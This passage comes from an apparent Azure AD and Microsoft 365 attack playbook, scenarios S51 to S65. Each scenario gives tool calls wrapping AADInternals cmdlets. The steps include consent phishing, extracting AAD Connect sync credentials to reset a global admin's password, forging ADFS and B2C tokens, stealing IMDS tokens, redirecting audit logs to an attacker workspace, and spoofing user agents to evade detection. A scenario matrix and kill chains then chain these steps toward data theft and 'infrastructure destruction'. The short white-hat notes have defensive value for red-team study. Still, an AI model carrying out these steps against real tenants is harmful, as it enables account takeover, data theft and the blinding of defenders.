**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** Medium
**MITRE:** T1550.001, T1098.003 | **Tools:** `raw_invoke`, `cred_token`

```
# 1. Create malicious app registration in attacker tenant
# 2. Send consent phishing link to victim user
#    URL: https://login.microsoftonline.com/{tenant}/oauth2/authorize?
#         client_id=<malicious_app>&response_type=code&scope=Mail.Read+Files.Read
# 3. After victim consents, use the app to access their data
cred_token(resource="graph", method="credentials",
           username="<app_id>", password="<app_secret>",
           tenant="m.grdz.org", save_as="consented_app")
# 4. Enumerate what the victim consented to
raw_invoke(cmdlet="Get-AADIntServicePrincipals", token_alias="graph")
```

**White hat use:** Test tenant consent policies. Are users blocked from consenting to external apps?
**Black hat use:** Victim clicks "Accept" on a permissions page. Attacker gets persistent API access to their mail, files, calendar. No password stolen. Survives MFA and password changes.
**Gray hat use:** Audit existing app consents for over-permissioned third-party apps.
**Key insight:** Unlike phishing, consent grants are PERSISTENT. The app retains access until admin revokes it.

---

### S52: Azure AD Connect Credential Extraction
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1552.004 | **Tools:** `raw_invoke`, `recon_sync_config`

```
# 1. Verify sync is configured
recon_sync_config(token_alias="graph")

# 2. Extract sync service account credentials
raw_invoke(cmdlet="Get-AADIntSyncCredentials", token_alias="graph")

# 3. Use extracted creds for password resets (S35) or object manipulation (S37)
privesc_password_reset(token_alias="sync_extracted",
                       target_user="globaladmin@m.grdz.org",
                       new_password="Pwn3d!2026")
```

**White hat use:** Demonstrate that AAD Connect servers are Tier 0 assets. If compromised, the sync account has god-mode over the directory.
**Black hat use:** Extract plaintext credentials from AAD Connect database. Use for password-less admin takeover.
**Internal audit use:** Verify that AAD Connect server is hardened, isolated, and monitored.
**Key insight:** The sync account can reset ANY user's password without knowing the old one, without MFA, bypassing PIM.

---

### S53: Cloud Shell Hijacking
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1059.009, T1021.007 | **Tools:** `cred_token`, `raw_invoke`

```
# 1. Get Cloud Shell token
cred_token(resource="cloud_shell", save_as="cloudshell")

# 2. Start Cloud Shell session
raw_invoke(cmdlet="Start-AADIntCloudShell", token_alias="cloudshell")

# 3. Execute commands in victim's Azure context
# Cloud Shell runs with the user's full Azure permissions
# Has access to: az CLI, kubectl, terraform, storage account
```

**White hat use:** Test if Cloud Shell is restricted by CA policies. Many orgs forget to cover it.
**Gray hat use:** Cloud Shell has a backing storage account with user scripts, SSH keys, terraform state.
**Black hat use:** Interactive shell with user's Azure permissions. Install persistence tools, exfil secrets from Key Vaults.
**Key insight:** Cloud Shell storage account often contains `.bash_history`, SSH keys, terraform tfstate files with secrets.

---

### S54: Hybrid Health Service Event Injection
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1565.001 | **Tools:** `raw_invoke`

```
# 1. List existing health services
raw_invoke(cmdlet="Get-AADIntHybridHealthServices", token_alias="graph")

# 2. Register a rogue health agent
raw_invoke(cmdlet="Register-AADIntHybridHealthServiceAgent",
           token_alias="graph",
           parameters={"ServiceId": "<service_id>"})

# 3. Inject fake AD FS audit events
raw_invoke(cmdlet="Send-AADIntHybridHealthServiceEvents",
           token_alias="graph",
           parameters={"ServiceId": "<service_id>"})
```

**White hat use:** Test health service monitoring. Can rogue agents register undetected?
**Black hat use:** Inject false ADFS events to mask real attacks or create noise for SOC distraction.
**Gray hat use:** Demonstrate that Hybrid Health is an unmonitored attack surface in most orgs.
**Key insight:** Most SOCs don't monitor Hybrid Health agent registrations. It's a blind spot.

---

### S55: Windows Hello for Business Key Injection
**Hat:** BLACK | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1098.005 | **Tools:** `raw_invoke`, `persist_device`

```
# 1. Join a rogue device (S29)
persist_device(token_alias="join", device_name="YOURCO-WS-0921",
               os_version="10.0.22631.4602", join_type="aad")

# 2. Set a Windows Hello for Business key on the device
raw_invoke(cmdlet="Set-AADIntDeviceWHfBKey",
           token_alias="join",
           parameters={"DeviceName": "YOURCO-WS-0921"})

# 3. Use WHfB key for passwordless auth as the device user
cred_token(resource="whfb", save_as="whfb_token")
```

**White hat use:** Test if device-based auth (WHfB) is restricted to corporate-managed devices only.
**Black hat use:** Inject attacker-controlled WHfB key onto rogue device. Passwordless login as victim.
**Key insight:** WHfB keys are trusted at the same level as passwords. Key injection = credential equivalent.

---

### S56: Application Proxy Agent Impersonation
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1090.001, T1021.007 | **Tools:** `raw_invoke`

```
# 1. List existing App Proxy agents
raw_invoke(cmdlet="Get-AADIntProxyAgents", token_alias="graph")
raw_invoke(cmdlet="Get-AADIntProxyAgentGroups", token_alias="graph")

# 2. Export agent bootstrap configurations
raw_invoke(cmdlet="Export-AADIntProxyAgentBootstraps", token_alias="admin")

# 3. Use exported config to impersonate a proxy agent
# Proxy agents relay traffic to internal apps -- impersonation = internal network access
```

**White hat use:** Audit App Proxy configuration. Are bootstrap secrets rotated? Are agents on hardened hosts?
**Black hat use:** Impersonate proxy agent to access internal web apps published through App Proxy without VPN.
**Gray hat use:** Demonstrate that App Proxy agents are high-value targets. Compromise one = access to all published internal apps.
**Key insight:** App Proxy bootstraps contain secrets that don't expire automatically. One-time extraction = persistent access.

---

### S57: Staged Rollout Policy Manipulation
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1556 | **Tools:** `raw_invoke`

```
# 1. Check current rollout policies
raw_invoke(cmdlet="Get-AADIntRolloutPolicies", token_alias="graph")

# 2. Create a rollout policy that forces weaker auth for a target group
raw_invoke(cmdlet="Set-AADIntRolloutPolicy", token_alias="graph",
           parameters={"Feature": "passwordHashSync", "IsEnabled": True})

# 3. Add the target admin group to the policy
raw_invoke(cmdlet="Add-AADIntRolloutPolicyGroups", token_alias="graph",
           parameters={"PolicyId": "<policy_id>",
                        "GroupId": "<admin_group_id>"})
```

**White hat use:** Test if rollout policy changes are monitored. Many orgs miss this.
**Black hat use:** Force admins into PHS auth (away from PTA/Fed), then crack their PHS hashes. Or force into Seamless SSO to enable Silver Ticket.
**Gray hat use:** Demonstrate that staged rollout is an auth method downgrade vector.
**Key insight:** Rollout policies can silently change HOW users authenticate without any user-visible change.

---

### S58: Azure IMDS Token Theft from VMs
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** LOW
**MITRE:** T1552.005 | **Tools:** `raw_invoke`

```
# From inside an Azure VM (via S42 or Cloud Shell):
raw_invoke(cmdlet="Get-AADIntAccessTokenUsingIMDS",
           parameters={"Resource": "https://management.azure.com"})

# Or target specific managed identity:
raw_invoke(cmdlet="Get-AADIntAccessTokenUsingIMDS",
           parameters={"Resource": "https://graph.microsoft.com",
                        "ClientId": "<managed_identity_client_id>"})
```

**White hat use:** Audit which VMs have managed identities and what permissions those identities have.
**Black hat use:** Any code running on an Azure VM can call IMDS (169.254.169.254) to get tokens. No credentials needed.
**Internal red team:** Demonstrate that VM compromise = cloud API access via managed identity.
**Key insight:** IMDS is accessible from any process on the VM. No authentication. If the managed identity has Directory.Read.All, you get DCSync capability.

---

### S59: SharePoint Site Membership Injection
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1098.003 | **Tools:** `raw_invoke`, `collect_sharepoint`

```
# 1. Enumerate SPO sites and find sensitive ones
collect_sharepoint(token_alias="spo",
                   site_url="https://mgrdz.sharepoint.com/sites/executive",
                   action="users")

# 2. Add attacker to the site's Azure AD group
raw_invoke(cmdlet="Set-AADIntSPOSiteMembers", token_alias="spo",
           parameters={"Site": "https://mgrdz.sharepoint.com/sites/executive",
                        "Members": "attacker@m.grdz.org"})

# 3. Access now-authorized content
collect_sharepoint(token_alias="spo",
                   site_url="https://mgrdz.sharepoint.com/sites/executive",
                   action="download",
                   file_path="/Shared Documents/Board_Minutes_2026.docx")
```

**White hat use:** Test SharePoint access controls. Can users self-add to sensitive sites?
**Black hat use:** Silently join executive, HR, legal, or M&A SharePoint sites. Download sensitive docs.
**Key insight:** Many orgs use M365 Group membership for SPO access. Group modification = site access.

---

### S60: Diagnostic Settings Manipulation (Stealth Logging Redirect)
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1562.008 | **Tools:** `raw_invoke`

```
# 1. Check current diagnostic settings
raw_invoke(cmdlet="Get-AADIntAzureDiagnosticSettings", token_alias="azure")
raw_invoke(cmdlet="Get-AADIntAzureDiagnosticSettingsDetails", token_alias="azure",
           parameters={"ResourceId": "<workspace_id>"})

# 2. Modify to redirect logs to attacker-controlled workspace
raw_invoke(cmdlet="Set-AADIntAzureDiagnosticSettingsDetails", token_alias="azure",
           parameters={"ResourceId": "<workspace_id>"})

# 3. Or remove diagnostic settings entirely
raw_invoke(cmdlet="Remove-AADIntAzureDiagnosticSettings", token_alias="azure",
           parameters={"ResourceId": "<workspace_id>"})
```

**White hat use:** Audit diagnostic pipeline integrity. Are settings monitored for changes?
**Black hat use:** More subtle than S38 (UAL disable). Redirect logs to attacker workspace instead of deleting them. Defender sees "logs are flowing" but they go to the wrong place.
**Key insight:** Redirecting is stealthier than disabling. S38 creates an obvious gap. S60 creates a silent redirect.

---

### S61: ADFS Token Decryption and Forging
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1606.002, T1552.004 | **Tools:** `raw_invoke`

```
# 1. Decrypt existing ADFS refresh token (need ADFS signing/encryption certs)
raw_invoke(cmdlet="Unprotect-AADIntADFSRefreshToken",
           parameters={"Token": "<encrypted_adfs_token>",
                        "PfxFileName": "/path/to/adfs_signing.pfx"})

# 2. Create a new ADFS refresh token for any user
raw_invoke(cmdlet="New-AADIntADFSRefreshToken",
           parameters={"PfxFileName": "/path/to/adfs_signing.pfx",
                        "UserPrincipalName": "admin@m.grdz.org"})

# 3. Use the forged refresh token to get access tokens
cred_token(resource="graph", save_as="adfs_forged")
```

**White hat use:** Demonstrate ADFS certificate protection requirements. Are certs in HSM?
**Black hat use:** With ADFS signing cert, forge tokens for ANY federated user. More targeted than Golden SAML (S27) -- works per-token without modifying federation config.
**Key insight:** Difference from Golden SAML: S27 modifies federation (LOUD). S61 uses existing certs (SILENT). S61 requires on-prem ADFS access; S27 requires cloud admin.

---

### S62: B2C Tenant Key Extraction
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1552.004 | **Tools:** `raw_invoke`

```
# 1. Extract B2C trust framework encryption keys
raw_invoke(cmdlet="Get-AADIntB2CEncryptionKeys", token_alias="graph")

# 2. Create B2C refresh token using extracted key
raw_invoke(cmdlet="New-AADIntB2CRefreshToken",
           parameters={"PublicKey": "<extracted_key>"})

# 3. Create B2C authorization code
raw_invoke(cmdlet="New-AADIntB2CAuthorizationCode",
           parameters={"PublicKey": "<extracted_key>"})
```

**White hat use:** Audit B2C key management. Are keys rotated? Are they accessible to non-admins?
**Black hat use:** B2C tenants handle customer authentication. Key extraction = forge auth for any customer account.
**Gray hat use:** Bug bounty finding -- demonstrate B2C key exposure to MSRC.
**Key insight:** B2C is often overlooked in security reviews. It's a separate trust boundary with its own keys.

---

### S63: ActiveSync Device Injection + MDM Bypass
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1098.005, T1562.001 | **Tools:** `raw_invoke`

```
# 1. Add a rogue ActiveSync device
raw_invoke(cmdlet="Add-AADIntEASDevice", token_alias="exo",
           parameters={"UserPrincipalName": "admin@m.grdz.org",
                        "DeviceType": "iPhone",
                        "DeviceModel": "iPhone15,3"})

# 2. Modify device settings to bypass MDM policies
raw_invoke(cmdlet="Set-AADIntEASSettings", token_alias="exo",
           parameters={"UserPrincipalName": "admin@m.grdz.org"})

# 3. Get device options/status
raw_invoke(cmdlet="Get-AADIntEASOptions", token_alias="exo",
           parameters={"UserPrincipalName": "admin@m.grdz.org"})
```

**White hat use:** Test ActiveSync device policies. Are unknown devices quarantined or blocked?
**Black hat use:** Register a fake mobile device. Sync email via EAS without MDM enrollment. Bypasses Intune device compliance.
**Key insight:** Many orgs focus CA policies on modern auth but leave ActiveSync wide open. EAS device registration doesn't require device compliance.

---

### S64: Compliance Portal Data Mining
**Hat:** GRAY | **Perspective:** PRIVILEGED | **OPSEC:** Medium
**MITRE:** T1530 | **Tools:** `cred_token`, `raw_invoke`

```
# 1. Get compliance portal access
cred_token(resource="compliance", save_as="compliance")

# 2. Get compliance API cookies for deep access
raw_invoke(cmdlet="Get-AADIntComplianceAPICookies", token_alias="compliance")

# 3. Search Unified Audit Log for sensitive events
raw_invoke(cmdlet="Search-AADIntUnifiedAuditLog", token_alias="compliance",
           parameters={"StartDate": "2026-03-01",
                        "EndDate": "2026-03-26",
                        "Operations": "FileDownloaded,MailItemsAccessed"})
```

**White hat use:** Audit who has compliance portal access. Test if eDiscovery permissions are properly scoped.
**Black hat use:** Compliance portal = search across ALL mailboxes, ALL SharePoint sites, ALL Teams chats. The ultimate data mining tool.
**Internal audit:** Review compliance role assignments. Only legal/compliance should have access.
**Key insight:** Compliance search bypasses per-user permissions. One account with eDiscovery Manager role = access everything in the tenant.

---

### S65: Tenant-Wide User Agent Masquerading
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Low
**MITRE:** T1036.005 | **Tools:** `raw_invoke`, then any tool

```
# 1. Set custom user agent to mimic legitimate Microsoft traffic
raw_invoke(cmdlet="Set-AADIntUserAgent",
           parameters={"UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Microsoft Outlook 16.0"})

# 2. All subsequent AADInternals requests now use this user agent
# Blends with normal Outlook traffic in sign-in logs

# 3. Alternative: mimic Azure CLI
raw_invoke(cmdlet="Set-AADIntUserAgent",
           parameters={"UserAgent": "python-requests/2.28.0 azure-cli/2.56.0"})

# 4. Or mimic Teams desktop
raw_invoke(cmdlet="Set-AADIntUserAgent",
           parameters={"UserAgent": "Mozilla/5.0 Teams/24295.606.3238.8740"})
```

**White hat use:** Test if SOC detections rely on user-agent strings. Many do.
**Black hat use:** Bypass user-agent-based anomaly detections. Sign-in from "Outlook" instead of "AADInternals".
**Gray hat use:** Demonstrate weakness of UA-based detection to security team.
**Key insight:** User-Agent is trivially spoofable. Any detection that relies solely on UA string is bypassable. This should be run FIRST before any authenticated scenario to blend all subsequent traffic.

---

## UPDATED SCENARIO MATRIX (S51-S65)

| # | Scenario | Category | OPSEC | Auth | MITRE | Primary Tool |
|---|----------|----------|-------|------|-------|-------------|
| 51 | OAuth Consent Grant | Credential Access | Medium | External | T1550 | raw_invoke |
| 52 | AAD Connect Cred Extract | Credential Access | HIGH | Privileged | T1552 | raw_invoke |
| 53 | Cloud Shell Hijack | Lat Movement | Medium | Internal | T1059 | raw_invoke |
| 54 | Health Service Injection | Defense Evasion | HIGH | Privileged | T1565 | raw_invoke |
| 55 | WHfB Key Injection | Persistence | Medium | Internal | T1098 | raw_invoke |
| 56 | App Proxy Impersonation | Lat Movement | HIGH | Privileged | T1090 | raw_invoke |
| 57 | Rollout Policy Downgrade | Defense Evasion | HIGH | Privileged | T1556 | raw_invoke |
| 58 | IMDS Token Theft | Credential Access | Low | Internal (VM) | T1552 | raw_invoke |
| 59 | SPO Membership Injection | Priv Escalation | Medium | Internal | T1098 | raw_invoke |
| 60 | Diagnostic Log Redirect | Defense Evasion | HIGH | Privileged | T1562 | raw_invoke |
| 61 | ADFS Token Forge | Credential Access | HIGH | Privileged | T1606 | raw_invoke |
| 62 | B2C Key Extraction | Credential Access | Medium | Internal | T1552 | raw_invoke |
| 63 | EAS Device Injection | Persistence | Medium | Ext+Cred | T1098 | raw_invoke |
| 64 | Compliance Data Mining | Collection | Medium | Privileged | T1530 | raw_invoke |
| 65 | User Agent Masquerading | Defense Evasion | Low | Any | T1036 | raw_invoke |

---

## NEW KILL CHAINS (I-K)

### Chain I: Silent Persistence (No Federation Modification)
```
S65 -> S17 -> S55 -> S32 -> S63
```
Set UA -> Phish -> WHfB Key Inject -> Rogue MFA App -> EAS Device Inject
(Three independent persistence paths, none touches federation settings)

### Chain J: Insider Threat -- Data Miner
```
S65 -> S19 -> S59 -> S47 -> S64 -> S38
```
Set UA -> FOCI Pivot -> SPO Inject -> SharePoint Exfil -> Compliance Search -> Disable Logs

### Chain K: Hybrid Infrastructure Destruction
```
S52 -> S35 -> S31 -> S57 -> S54 -> S60
```
Extract Sync Creds -> Reset All Passwords -> Rogue PTA -> Downgrade Auth -> Inject Health Events -> Redirect Logs
